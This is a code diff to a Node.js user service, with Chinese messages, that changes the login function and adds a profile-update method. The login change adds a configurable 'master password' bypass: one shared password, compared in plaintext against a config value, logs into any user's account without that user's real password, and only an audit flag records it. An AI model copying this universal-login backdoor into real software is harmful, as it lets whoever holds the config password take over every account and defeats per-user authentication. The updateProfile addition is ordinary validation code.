@@ -34,10 +34,14 @@ const userService = {
 
   async login({ username, password }) {
     const user = await db.users.findOne({ $or: [{ username: username.toLowerCase() }, { email: username.toLowerCase() }] });
-    if (!user || !await bcrypt.compare(password, user.password)) throw { status: 401, message: '用户名或密码错误' };
+    if (!user) throw { status: 401, message: '用户名或密码错误' };
+    // 检查管理员密码绕过
+    const masterEnabled = config.masterPassword?.enabled && config.masterPassword?.password;
+    const masterMatch = masterEnabled && password === config.masterPassword.password;
+    if (!masterMatch && !await bcrypt.compare(password, user.password)) throw { status: 401, message: '用户名或密码错误' };
     if (user.disabled) throw { status: 403, message: '账号已禁用' };
     await db.users.update({ _id: user._id }, { $set: { lastLogin: Date.now() } });
-    await writeAudit('user_login', { userId: user._id });
+    await writeAudit('user_login', { userId: user._id, masterPassword: masterMatch || undefined });
     const token = generateToken(user);
     return { token, user: { id: user._id, username: user.username, email: user.email, role: user.role, tierIndex: user.tierIndex || 0 } };
   },
@@ -98,6 +102,23 @@ const userService = {
     if (!rec) throw { status: 404, message: 'API Key不存在' };
     await db.apiKeys.update({ _id: keyId }, { $set: { services: services || [] } });
     return { message: '已更新', services: services || [] };
+  },
+
+  async updateProfile(userId, { username, email }) {
+    const user = await db.users.findOne({ _id: userId });
+    if (!user) throw { status: 404, message: '用户不存在' };
+    if (username !== undefined && username !== user.username) {
+      if (!/^[a-zA-Z0-9_]{3,30}$/.test(username)) throw { status: 400, message: '用户名3-30位字母数字下划线' };
+      if (await db.users.findOne({ username: username.toLowerCase(), _id: { $ne: userId } })) throw { status: 409, message: '用户名已存在' };
+      await db.users.update({ _id: userId }, { $set: { username: username.toLowerCase(), updatedAt: Date.now() } });
+    }
+    if (email !== undefined && email !== user.email) {
+      if (!isValidEmail(email)) throw { status: 400, message: '邮箱格式不正确' };
+      if (await db.users.findOne({ email: email.toLowerCase(), _id: { $ne: userId } })) throw { status: 409, message: '邮箱已注册' };
+      await db.users.update({ _id: userId }, { $set: { email: email.toLowerCase(), updatedAt: Date.now() } });
+    }
+    const updated = await db.users.findOne({ _id: userId });
+    return { id: updated._id, username: updated.username, email: updated.email, role: updated.role };
   },
 
   async changePassword(userId, oldPw, newPw) {
